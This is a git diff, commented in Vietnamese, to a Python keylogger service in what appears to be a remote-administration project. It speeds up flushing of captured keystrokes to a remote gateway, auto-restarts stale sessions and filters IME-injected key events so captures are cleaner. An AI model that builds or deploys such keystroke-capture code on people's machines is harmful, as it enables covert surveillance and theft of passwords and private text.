@@ -21,8 +21,9 @@ logger = logging.getLogger("KeyloggerModule")
 
 _user32 = ctypes.windll.user32
 
-# Xả buffer mỗi 2 giây (hoặc khi đạt 50 phím) theo docs/api_contract.md
-FLUSH_INTERVAL_SECONDS = 2.0
+# Xả buffer nhanh (0.5s) để log hiển thị gần như real-time / liên tục
+# (hoặc khi đạt FLUSH_MAX_BUFFER phím thì xả ngay).
+FLUSH_INTERVAL_SECONDS = 0.5
 FLUSH_MAX_BUFFER = 50
 
 
@@ -58,13 +59,18 @@ class KeyloggerService:
         """
         Khởi chạy Dịch vụ Lắng nghe Bàn phím.
 
+        Idempotent: nếu keylogger đang chạy (VD: phiên trước bị sót do Admin
+        reload/đóng trang đột ngột nên chưa nhận được lệnh stop), tự động dừng
+        phiên cũ rồi khởi động lại — lệnh start LUÔN thành công, không báo lỗi
+        ALREADY_RUNNING (giống Live Screen).
+
         Args:
             on_flush_callback: Hàm nhận (entries, window_title) để gửi về Gateway
                                 dưới dạng message keylogger.data.
         """
         if self.is_logging:
-            logger.warning("⚠️ Keylogger đã đang trong trạng thái hoạt động!")
-            return
+            logger.warning("⚠️ Keylogger đã đang chạy — tự động dừng phiên cũ và khởi động lại.")
+            self.stop_logging()
 
         self.is_logging = True
         self._on_flush_callback = on_flush_callback
@@ -98,16 +104,32 @@ class KeyloggerService:
         self.flush_buffer()
         logger.info("🛑 [KEYLOGGER] Đã dừng dịch vụ Ghi nhật ký bàn phím.")
 
-    def _on_key_press(self, key):
+    def _on_key_press(self, key, injected: bool = False):
         """
         Callback xử lý mỗi khi có 1 phím được bấm down.
+
+        Args:
+            key: Phím được nhấn (KeyCode/Key).
+            injected: True nếu sự kiện do IME/phần mềm khác "chèn" (synthetic)
+                      chứ KHÔNG phải phím vật lý người dùng bấm. Bỏ qua để tránh:
+                      - Ghi trùng ký tự khi gõ bằng IME (VD: gõ 'w' bị ghi 'wư').
+                      - Ghi 'BACKSPACE' giả do IME tự sửa cách gõ.
+                      (pynput win32 truyền tham số này; backends khác luôn là False)
         """
+        if injected:
+            return
+
         key_label = ""
 
         try:
             # Ký tự phím thường (a-z, 0-9, symbol)
             if hasattr(key, 'char') and key.char is not None:
                 key_label = key.char
+                # Một số layout/IME báo phím Space dưới dạng KeyCode(char=' ') thay
+                # vì Key.space -> quy về nhãn "SPACE" để log nhất quán và hiển thị rõ
+                # (khoảng trắng literal bị vô hình trong log web).
+                if key_label == " ":
+                    key_label = "SPACE"
             else:
                 # Phím chức năng đặc biệt
                 if key == keyboard.Key.space:
